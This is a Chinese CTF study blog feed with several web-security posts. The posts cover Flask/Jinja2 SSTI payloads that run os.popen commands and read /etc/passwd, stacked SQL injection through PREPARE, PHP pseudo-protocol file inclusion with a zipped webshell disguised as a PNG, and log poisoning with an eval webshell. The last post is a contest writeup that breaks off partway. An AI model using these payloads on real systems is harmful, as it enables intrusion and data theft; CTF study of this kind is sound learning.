flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">17 current_app          应用上下文，一个全局变量。</span><br><span class="line">18</span><br><span class="line">19 request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line"></span><br><span class="line">20 request.args.x1    get传参</span><br><span class="line">21 request.values.x1  所有参数</span><br><span class="line">22 request.cookies      cookies参数</span><br><span class="line">23 request.headers      请求头参数</span><br><span class="line">24 request.form.x1    post传参(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">25 request.data   post传参(Content-Type:a/b)</span><br><span class="line">26 request.json post传json  (Content-Type: application/json)</span><br><span class="line">27 config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line"></span><br><span class="line">28 g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#x27;flask_ssti&#x27;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这是模板的基本语法：</span><br><span class="line">控制结构 &#123;%  %&#125;</span><br><span class="line"></span><br><span class="line">变量取值 &#123;&#123;    &#125;&#125; </span><br><span class="line"></span><br><span class="line">注释 &#123;#    #&#125;*</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>SSTI模板注入源于python的一个框架叫flask：Flask是一个轻量级的python的web框架，轻量级说明他只适用于构建小型网站</p><p>举个例子更好的认识上面的方法使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">class A:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">class B:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">class C(A):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line">class D(A):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">c = C()</span><br><span class="line">a = A()</span><br><span class="line"></span><br><span class="line">print(c.__class__)//输出&lt;class &#x27;__main__.C&#x27;&gt;</span><br><span class="line">print(c.__class__.__bases__)//输出(&lt;class &#x27;__main__.A&#x27;&gt;,)</span><br><span class="line">print(c.__class__.__base__)//输出&lt;class &#x27;__main__.A&#x27;&gt;</span><br><span class="line">print(c.__class__.__mro__)//输出(&lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">print(a.__class__.__mro__.__init__())//输出None</span><br><span class="line">print(a.__class__.__subclasses__())//输出[&lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.D&#x27;&gt;]</span><br><span class="line">print(a.__class__.__subclasses__()[0].__init__.__globals__)//输出&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x00000239CF1A1CF8&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;D://xx/xx/1.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;A&#x27;: &lt;class &#x27;__main__.A&#x27;&gt;, &#x27;B&#x27;: &lt;class &#x27;__main__.B&#x27;&gt;, &#x27;C&#x27;: &lt;class &#x27;__main__.C&#x27;&gt;, &#x27;D&#x27;: &lt;class &#x27;__main__.D&#x27;&gt;, &#x27;c&#x27;: &lt;__main__.C object at 0x00000239CF2264E0&gt;, &#x27;a&#x27;: &lt;__main__.A object at 0x00000239CF2269B0&gt;&#125;</span><br><span class="line">就是把这个文件下的所有的类，所有的方法全都打印输出</span><br></pre></td></tr></table></figure><h4 id="2-文件读取的操作"><a href="#2-文件读取的操作" class="headerlink" title="2 文件读取的操作"></a>2 文件读取的操作</h4><p><strong>注入思路</strong></p><ul><li>随便找一个内置类对象用<code>__class__</code>拿到他所对应的类</li><li>用<code>__bases__</code>拿到基类（<code>&lt;class &#39;object&#39;&gt;</code>）</li><li>用<code>__subclasses__()</code>拿到子类列表</li><li>在子类列表中直接寻找可以利用的类（方法，函数）getshell，也可以通过脚本找个可利用类的方法（好难）！</li></ul><h6 id="方法1：popen-方法"><a href="#方法1：popen-方法" class="headerlink" title="方法1：popen()方法"></a>方法1：popen()方法</h6><p>​注意：必须在os的类下才可以执行此方法，且python2版本不可使用！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：os.popen(command[, mode[, bufsize]])</span><br></pre></td></tr></table></figure><h6 id="方法2：-builtins-下的多个函数"><a href="#方法2：-builtins-下的多个函数" class="headerlink" title="方法2：__builtins__下的多个函数"></a>方法2：<code>__builtins__下的多个函数</code></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># python3</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;cat /fl4g|base64&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"># python2</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>python中常见的SSTI的payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[128].__init__.__globals__[&#x27;sys&#x27;].modules[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()</span><br><span class="line">//其实这里面的-1就是列表从右到左按下标取值，-1表示从右到左数的一个值</span><br><span class="line"></span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br><span class="line"></span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-例子精讲"><a href="#3-例子精讲" class="headerlink" title="3 例子精讲"></a>3 例子精讲</h4><h6 id="1-第一题"><a href="#1-第一题" class="headerlink" title="1  第一题"></a>1  第一题</h6><p>下面我会以Newstarctf week3的一道例题来进行讲解，方便理解！</p><h6 id="2-第二题"><a href="#2-第二题" class="headerlink" title="2 第二题"></a>2 第二题</h6>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL预处理</title>
      <link href="/2022/10/16/SQL%E9%A2%84%E5%A4%84%E7%90%86/"/>
      <url>/2022/10/16/SQL%E9%A2%84%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL预处理"><a href="#SQL预处理" class="headerlink" title="SQL预处理"></a>SQL预处理</h1><p>这边建议你有了SQL的基础，再来读这篇文章。</p><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1 原理"></a>1 原理</h3><p><strong>即时 SQL</strong><br>一条 SQL 直接是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL），具体如下</p><p>词法和语义解析；<br>优化 SQL 语句，制定执行计划；<br>执行并返回结果；<br>但是，在绝大多数情况下，如果需求某一条 SQL 语句被反复调用执行，或者每次执行的时候只有个别的值不同。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显降低了许多。这个时候就需要预处理sql</p><p><strong>预处理SQL</strong><br>预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。　MySQL 预处理语句的支持版本较早，所以我们目前普遍使用的 MySQL 版本都是支持这一语法的。</p><h3 id="2-利用"><a href="#2-利用" class="headerlink" title="2 利用"></a>2 利用</h3><p>MySQL 官方将 prepare、execute、deallocate 统称为 PREPARE STATEMENT。翻译也就习惯的称其为预处理语句</p><p>其实这主要是和concat函数在堆叠注入用在一起当做一种SQL注入的利用姿势！（我的理解）</p><p>当然了，预处理可以和char函数，16进制等等方式来结合！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PREPARE name from &#x27;[my sql sequece]&#x27;;   //预定义SQL语句（）</span><br><span class="line">EXECUTE name;  //执行预定义SQL语句</span><br><span class="line">(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL        语句 </span><br><span class="line">要使用变量的地方 用?表示</span><br></pre></td></tr></table></figure><h6 id="1-用于字符串的拼接操作"><a href="#1-用于字符串的拼接操作" class="headerlink" title="1 用于字符串的拼接操作"></a>1 用于字符串的拼接操作</h6><p>​例如下面的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;;set @sql=concat(&#x27;up&#x27;,&#x27;date `score` set listen=123 where username=&quot;火华&quot;&#x27;);prepare sql_exe FROM @sql;execute sql_exe#       还是newstarctf的一道题为例子</span><br></pre></td></tr></table></figure><p>由于题目过滤了update，但我们却要使用，就只能采取这种预处理的方式。不然只能考虑换关键字，换方法了。</p><p>强网杯的随便注也可以用这种姿势。</p><p>​2 用来变量的定义替换</p><p>文章参考：<a href="https://www.cnblogs.com/geaozhang/p/9891338.html">MySQL的SQL预处理(Prepared) - GeaoZhang - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP伪协议总结</title>
      <link href="/2022/10/13/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/"/>
      <url>/2022/10/13/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="二-PHP伪协议绕过总结"><a href="#二-PHP伪协议绕过总结" class="headerlink" title="二 PHP伪协议绕过总结"></a>二 PHP伪协议绕过总结</h3><p>原理：</p><ul><li>allow_url_fopen ：on #默认开启 ，表示允许url里的封装协议访问文件；</li><li>allow_url_include：off #默认关闭，表示不允许包含url里的封装协议包含文件；</li></ul><h4 id="1-php-x2F-x2F-input"><a href="#1-php-x2F-x2F-input" class="headerlink" title="1.php:&#x2F;&#x2F;input"></a>1.php:&#x2F;&#x2F;input</h4><p><strong>注意点</strong><br>①input必须以post请求<br>②enctype&#x3D;“multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的<br>③allow_url_include&#x3D;on</p><p>  php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流,可以让本来的get参数从post获得数据</p><p>使用的时候不要把数据包中的GET改成POST，直接在下面空一行填参数内容内容即可(不要加参数名&#x3D;)</p><p>1.绕过file_get_contents内容检查</p><p>2.通过include实现代码执行</p><h4 id="2-data-x2F-x2F-同样可以用来绕过file-get-contents的内容检查"><a href="#2-data-x2F-x2F-同样可以用来绕过file-get-contents的内容检查" class="headerlink" title="2 data:&#x2F;&#x2F;        同样可以用来绕过file_get_contents的内容检查,"></a>2 data:&#x2F;&#x2F;        同样可以用来绕过file_get_contents的内容检查,</h4><p>​使用条件:<br>​allow_url_fopen,allow_url_include 均为on</p><p>将攻击代码转换为data:URL形式进行攻击，以传递相应格式的数据用来执行PHP代码。为了防止直接在URL连接中的一些敏感字符被waf检测拦截，可将攻击代码进行base64编码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="string">&#x27;r&#x27;</span>)==<span class="string">&#x27;get flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;success!&#x27;</span>.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;wrong file!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以用<br>?a&#x3D;data:text&#x2F;plain,get flag<br>或a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,get flag<br>或a&#x3D;data:text&#x2F;plain,get flag<br>拿到flag,<br>也可以使用base64编码:<br>a&#x3D;data:text&#x2F;plain;base64,Z2V0IGZsYWc&#x3D;</p><h4 id="3-php-x2F-x2F-filter"><a href="#3-php-x2F-x2F-filter" class="headerlink" title="3 php:&#x2F;&#x2F;filter"></a>3 php:&#x2F;&#x2F;filter</h4><p><img src="/2022/10/13/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/Users\86177\Desktop\CTF\图片\filter.png" alt="filter"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果直接包含flag.php的话是读不到源代码的,但我们可以访问</p><p>?a&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>得到flag.php base64编码后的源代码</p><h4 id="4-phar-x2F-x2F-类似于zip伪协议"><a href="#4-phar-x2F-x2F-类似于zip伪协议" class="headerlink" title="4 phar:&#x2F;&#x2F;   类似于zip伪协议"></a>4 phar:&#x2F;&#x2F;   类似于zip伪协议</h4><p>这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。</p><p>　　用法：?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php 注意： PHP &gt; &#x3D;5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。注意：PHP &gt; &#x3D;5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 　　步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。</p><p>　　</p><p>　　在CTF中，可以利用这些伪协议来进行骚操作</p><p><a href="https://img2020.cnblogs.com/i1/1678972/202005/1678972-20200503145841452-2005716470.png"><img src="https://img2020.cnblogs.com/i1/1678972/202005/1678972-20200503145841452-2005716470.png" alt="img"></a></p><h4 id="5-glob-x2F-x2F-伪协议"><a href="#5-glob-x2F-x2F-伪协议" class="headerlink" title="5 glob:&#x2F;&#x2F;伪协议"></a>5 glob:&#x2F;&#x2F;伪协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">glob``:``// — 查找匹配的文件路径模式</span><br></pre></td></tr></table></figure><p>glob:&#x2F;&#x2F;是php自5.3.0版本起开始生效的一个用来筛选目录的伪协议，其用法示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 循环 ext/spl/examples/ 目录里所有 *.php 文件</span><br><span class="line">// 并打印文件名和文件尺寸</span><br><span class="line">$it = new DirectoryIterator(&quot;glob://ext/spl/examples/*.php&quot;);</span><br><span class="line">foreach($it as $f) &#123;   </span><br><span class="line">printf(&quot;%s: %.1FK\n&quot;, $f-&gt;getFilename(), $f-&gt;getSize()/1024);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>只是用glob:&#x2F;&#x2F;伪协议是无法直接绕过的，它需要结合其他函数组合利用，主要有以下两种利用方式，局限性在于它们都只能列出根目录下和open_basedir指定的目录下的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。</p><h3 id="方式1——DirectoryIterator-glob-x2F-x2F"><a href="#方式1——DirectoryIterator-glob-x2F-x2F" class="headerlink" title="方式1——DirectoryIterator+glob:&#x2F;&#x2F;"></a>方式1——DirectoryIterator+glob:&#x2F;&#x2F;</h3><p>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口。</p><p>DirectoryIterator与glob:&#x2F;&#x2F;结合将无视open_basedir，列举出根目录下的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$c = $_GET[&#x27;c&#x27;];</span><br><span class="line">$a = new DirectoryIterator($c);</span><br><span class="line">foreach($a as $f)&#123;    </span><br><span class="line">echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输入<code>glob:///*</code>即可列出根目录下的文件，但是会发现只能列根目录和open_basedir指定的目录的文件：</p><h3 id="方式2——opendir-readdir-glob-x2F-x2F"><a href="#方式2——opendir-readdir-glob-x2F-x2F" class="headerlink" title="方式2——opendir()+readdir()+glob:&#x2F;&#x2F;"></a>方式2——opendir()+readdir()+glob:&#x2F;&#x2F;</h3><p>opendir()函数为打开目录句柄，readdir()函数为从目录句柄中读取条目。</p><p>这里结合两个函数来列举根目录中的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&#x27;c&#x27;];</span><br><span class="line">if ( $b = opendir($a) ) &#123;</span><br><span class="line">while ( ($file = readdir($b)) !== false ) &#123;       </span><br><span class="line">echo $file.&quot;&lt;br&gt;&quot;;    </span><br><span class="line">&#125;    </span><br><span class="line">closedir($b);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>效果和方式1是一样的，只能Bypass open_basedir来列举根目录中的文件，不能列举出其他非根目录和open_basedir指定的目录中的文件。</p><h3 id="6-zib伪协议"><a href="#6-zib伪协议" class="headerlink" title="6 zib伪协议"></a>6 zib伪协议</h3><p>?file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow 知识总结</title>
      <link href="/2022/10/13/ctfshow-%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2022/10/13/ctfshow-%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><ol><li>url&#x2F;.git&#x2F;index.php</li><li>url&#x2F;<a href="http://www.zip/">www.zip</a></li><li>url&#x2F;.siv&#x2F;</li><li>url&#x2F;index.php.swp</li><li>url&#x2F;index.php.bak</li><li>url&#x2F;.hg&#x2F;</li></ol><h1 id="无参rce"><a href="#无参rce" class="headerlink" title="无参rce"></a>无参rce</h1><h3 id="首先总结一下读取flag-php的操作"><a href="#首先总结一下读取flag-php的操作" class="headerlink" title="首先总结一下读取flag.php的操作"></a>首先总结一下读取flag.php的操作</h3><p>cat&#x2F;tac&#x2F;system&#x2F;nl&#x2F;show_source&#x2F;echo+file_get_contents&#x2F;var_dump(scandir(‘.’));（扫描目录并回显）&#x2F;highlight_file</p><p>文件复制名法：cp${IFS}&#x2F;fla?${IFS}&#x2F;var&#x2F;www&#x2F;html&#x2F;a.txt||ls   然后url&#x2F;a.txt  （当然也可以试试移动法）</p><p>PHP几种伪协议，详见我的另一篇文章</p><h3 id="过滤字母数字，没过滤-和"><a href="#过滤字母数字，没过滤-和" class="headerlink" title="过滤字母数字，没过滤 .和?"></a>过滤字母数字，没过滤 .和?</h3><p>可以考虑远程文件上传，利用PHP特性，抓包来传递参数</p><h3 id="过滤字母数字，-和"><a href="#过滤字母数字，-和" class="headerlink" title="过滤字母数字，.和?"></a>过滤字母数字，.和?</h3><p>可以利用PHP的特性:输出后自加再取反</p><p>原理是：<br><code>$&#123;_&#125;=&quot;&quot;</code><br><code>$(($&#123;_&#125;))=0</code><br><code>$((~$(($&#123;_&#125;))))=-1</code><br>然后拼接出-36在进行取反</p><p>注意的是：${_}会输出上一次的执行结果</p><p>&#x2F;?c&#x3D;$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))   即C&#x3D;36</p><h3 id="日志包含法"><a href="#日志包含法" class="headerlink" title="日志包含法"></a>日志包含法</h3><p>先再UA代理那里改一下：<?php eval($_POST[a]);?>  然后url&#x2F;?1&#x3D;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>最后post传参 参数&#x3D;include($_GET[1]);&amp;a&#x3D;要执行的命令</p><h3 id="输出所有变量法（POST）"><a href="#输出所有变量法（POST）" class="headerlink" title="输出所有变量法（POST）"></a>输出所有变量法（POST）</h3><p>include(‘flag.php’);var_dump(get_defined_vars());    也可能是根目录的&#x2F;flag.txt</p><p>include(‘flag.php’);echo $flag;</p><p>incldue(‘&#x2F;flag.txt’);</p><h1 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h1><h3 id="运算符顺序"><a href="#运算符顺序" class="headerlink" title="运算符顺序"></a>运算符顺序</h3><p>&amp;&amp; &gt; || &gt; &#x3D; &gt; and &gt; or</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br></pre></td></tr></table></figure><p>所以以下判断只要v1是数字，即符合语法，跟v2，v3都无关！</p><h3 id="PHP变量覆盖"><a href="#PHP变量覆盖" class="headerlink" title="PHP变量覆盖"></a>PHP变量覆盖</h3><p>变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击。</p><p>经常导致变量覆盖漏洞场景有：$$，extract()函数，parse_str()函数等.</p><h3 id="哈希值相等判断"><a href="#哈希值相等判断" class="headerlink" title="哈希值相等判断"></a>哈希值相等判断</h3><p>数组绕过，数值相等绕过，以及0e开头哈希值相等绕过！</p><h3 id="ereg漏洞"><a href="#ereg漏洞" class="headerlink" title="ereg漏洞"></a>ereg漏洞</h3><p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</p><h3 id="Exception-异常处理类"><a href="#Exception-异常处理类" class="headerlink" title="Exception 异常处理类"></a>Exception 异常处理类</h3><h3 id="FilesystemIterator-获取指定目录下的所有文件"><a href="#FilesystemIterator-获取指定目录下的所有文件" class="headerlink" title="FilesystemIterator 获取指定目录下的所有文件"></a>FilesystemIterator 获取指定目录下的所有文件</h3><p>可以查看当前目录的第一个文件，不带..或者.表示上一级和当前目录的文件！</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10月校赛wp</title>
      <link href="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/"/>
      <url>/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<p>由于本人热衷于web，致力于做一个好的web手，所以一般做题只做web，偶尔做一下misc，这次校赛本人真的菜，就做了一道，下次一定继续努力！故复现一下题目并整理一下wp，记录自己的成长之路并方便以后复习！</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="baby开胃菜"><a href="#baby开胃菜" class="headerlink" title="baby开胃菜"></a>baby开胃菜</h2><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/2.png"></p><p>我们直接查看F12源代码</p><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/3.png"></p><p>看到了一点提示，并且说了登录里藏了点东西，所以查看主界面右上角的登录</p><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/4.png"></p><p>看到是个后台登录界面，直接F12查看源代码大法</p><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/5.png"></p><p>所以试试账号，密码，此过程根据提示省略辣</p><p>当账号为admin123456时的回显</p><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/7.png"></p><p>当账号为admin1234567时的回显</p><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/8.png"></p><p>然后账号输入正确时，密码回显如下</p><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/9.png"></p><p>通过上面的a2.html里显示了密码的过滤方式</p><p><img 